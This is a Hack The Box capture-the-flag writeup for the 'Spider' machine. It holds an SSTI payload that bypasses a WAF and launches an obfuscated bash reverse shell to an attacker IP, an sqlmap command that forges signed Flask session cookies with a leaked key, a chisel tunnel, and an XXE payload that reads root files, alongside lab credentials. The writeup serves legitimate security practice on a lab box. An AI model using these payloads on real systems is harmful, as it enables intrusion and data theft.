---
title: Spider
tags: 
    - SQL Injection
    - Jwt Tampering
    - XXE
    - "Hard Machines"
categories:
    - "Hack The Box Writeup"
date: 2022-01-13
description: "Hack The Box Machine - Spider writeup"
author: "Tejas"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
disableHLJS: false 
disableHLJS: false
hideSummary: true
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: false
UseHugoToc: true
cover:
    image: "https://pbs.twimg.com/media/E2ZXCszXoAUpjh0?format=jpg&name=4096x4096" # image path/url
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---

## Enumeration

### Open Ports

```bash
# Nmap 7.91 scan initiated Sun May 30 00:34:18 2021 as: nmap -sC -sS -sV -vv -oN nmap.txt spider.htb
Nmap scan report for spider.htb (10.10.10.243)
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2021-05-30 00:34:25 IST for 15s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZKP7Ebfve8CuM7AUHwkj38Y/0Pw04ub27AePqlhmH8FpgdDCkj3WINW8Yer3nmxZdh7zNadl6FZXYfmRRl/K3BC33Or44id3e8Uo87hMKP9F5Nv85W7LfaoJhsHdwKL+u3h494N1Cv0n2ujJ2/KCYLQRZwvn1XfS4crkTVmNyrw3xtCYq0aCHNYxp51/WhNRULDf0MUMnA78M/1K9+erVCg4tOVMBisu2SD7SHN//E2IwSfHJTHfyDj+/zi6BbKzW+4rIxxJr2GRNDaPlYXsm3/up5M+t7lMIYwHOTIRLu3trpx4lfWfIKea9uTNiahCARy3agSmx7f1WLp5NuLeH
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLxMnAdIHruSk1hB7McjxnudQ7f6I5sKPh1NpJd3Tmb9tedtLNqqPXtzroCP8caSRkfXjtJ/hp+CiobuuYW8+fU=
|   256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJq0AuboJ6i4Hv3fUwQku//NLipnLhz1PfrV5KZ89eT
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: F732B9BF02F87844395C3A78B6180A7E
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to Zeta Furniture.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 30 00:34:40 2021 -- 1 IP address (1 host up) scanned in 22.51 seconds
```
## Web Enumeration

{{< figure src="images/20210531100053.png">}}

* We land on the above webapp. I tried to enumerate subdomains, UDP ports, Directories Nothing useful. 

* But if u notice the above screenshot, I can see there is `%` in Discount. I felt like it was using Template. So I tried SSTI idetification payload `{{7*7}}`.
* I ran that payload in all the fields available to see if its rendered. Eventually the signup page renders it.

{% asset_img 20210531100513.png %}
{% asset_img 20210531100623.png %}

* It has been rendered and the output can be seen in `/user`.
---
## FootHold
Let's try to extract the config `{{config}}`
{{< highlight json >}}
{
  "ENV": "production",
  "DEBUG": "False",
  "TESTING": "False",
  "PROPAGATE_EXCEPTIONS": "None",
  "PRESERVE_CONTEXT_ON_EXCEPTION": "None",
  "SECRET_KEY": "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942",
  "PERMANENT_SESSION_LIFETIME": "datetime.timedelta(31)",
  "USE_X_SENDFILE": "False",
  "SERVER_NAME": "None",
  "APPLICATION_ROOT": "/",
  "SESSION_COOKIE_NAME": "session",
  "SESSION_COOKIE_DOMAIN": "False",
  "SESSION_COOKIE_PATH": "None",
  "SESSION_COOKIE_HTTPONLY": "True",
  "SESSION_COOKIE_SECURE": "False",
  "SESSION_COOKIE_SAMESITE": "None",
  "SESSION_REFRESH_EACH_REQUEST": "True",
  "MAX_CONTENT_LENGTH": "None",
  "SEND_FILE_MAX_AGE_DEFAULT": "datetime.timedelta(0, 43200)",
  "TRAP_BAD_REQUEST_ERRORS": "None",
  "TRAP_HTTP_EXCEPTIONS": "False",
  "EXPLAIN_TEMPLATE_LOADING": "False",
  "PREFERRED_URL_SCHEME": "http",
  "JSON_AS_ASCII": "True",
  "JSON_SORT_KEYS": "True",
  "JSONIFY_PRETTYPRINT_REGULAR": "False",
  "JSONIFY_MIMETYPE": "application/json",
  "TEMPLATES_AUTO_RELOAD": "None",
  "MAX_COOKIE_SIZE": 4093,
  "RATELIMIT_ENABLED": "True",
  "RATELIMIT_DEFAULTS_PER_METHOD": "False",
  "RATELIMIT_SWALLOW_ERRORS": "False",
  "RATELIMIT_HEADERS_ENABLED": "False",
  "RATELIMIT_STORAGE_URL": "memory://",
  "RATELIMIT_STRATEGY": "fixed-window",
  "RATELIMIT_HEADER_RESET": "X-RateLimit-Reset",
  "RATELIMIT_HEADER_REMAINING": "X-RateLimit-Remaining",
  "RATELIMIT_HEADER_LIMIT": "X-RateLimit-Limit",
  "RATELIMIT_HEADER_RETRY_AFTER": "Retry-After",
  "UPLOAD_FOLDER": "static/uploads"
}
{{< /highlight >}}


### JWT SECRET_KEY

```
Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942
```

Now am guessing there is SQLi in the website similar to `PROPER HTB BOX`. As the JWT token hints me about the hash in it as a tamper checker.

Now as we inject with SQLi with `SQLMAP` the JWT Token should also change as the value of the JWT Paramert will change. 

So we shall automate it with [PYTHON FLASK UNSIGN](https://book.hacktricks.xyz/pentesting/pentesting-web/flask)


### SQLMAP QUERY

```bash
sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --delay 1 --dump
```

For some reason I wasn't able to use `--batch` flag to automate the answering SQLMAP questions.

So answer to the questions as Follow:
```
Y
N
N
N
```
Note: If you get a quesiton with no `y or n` as option enter `c`.


From The SQLMAP DUMP

{% asset_img 20210531102046.png %}

I logged in as chiv and I got access to adminapp.

**CREDENTIALS:** `129f60ea-30cf-4065-afb9-6be45ad38b73:ch1VW4sHERE7331`

I got Adminapp 
{{< figure src="images/20210531102419.png">}}

There was note left:

{{< figure src="images/20210531102433.png">}}

Upon visiting `http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal`

I got Support portal and I tried to do SSTI again. It had a WAF. So let's bypass it 

{{< figure src="images/20210531102543.png">}}
{{< figure src="images/20210531102549.png">}}
{{< figure src="images/20210531102627.png">}}

So upon trying lot's of payloads and bypassing characters. By using hex for `_` and `Base64encode` for `.` and stuff.

I ended up with following payload.

```python
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNi85MDAxIDA+JjE= | base64 -d | bash")["read"]() %} a {% endwith %}
```

I got shell as `Chiv` and I converted the current shell to `SSH`. 

**I GOT USER FLAG!**

---

## PRIVILEGE ESCALATION

### XXE

* I can see open ports in local host with `8080`, I got another webpage.
Let's exploit it. I used chisel to port forward it.

```
[LOCAL MACHINE]: ./chisel server -p 8000 -reverse -v


[REMOTE MACHINE]: ./chisel client 10.10.14.26:8000 R:8080:127.0.0.1:8080
```

* After enumerating the page.... `<` as name gives some error this makes me wonder if it has XXE. 
 
* I also found an hidden parameter, which can be made visible by inspect element in web browser and change it from `hidden` to `show`.

{{< figure src="images/20210531103552.png" >}}


in the email section put `&grem;` and in version have to put `1.0.0--><!DOCTYPE root [<!ENTITY grem SYSTEM 'file:///root/root.txt'>]> <!--`

**I GOT ROOT FLAG!**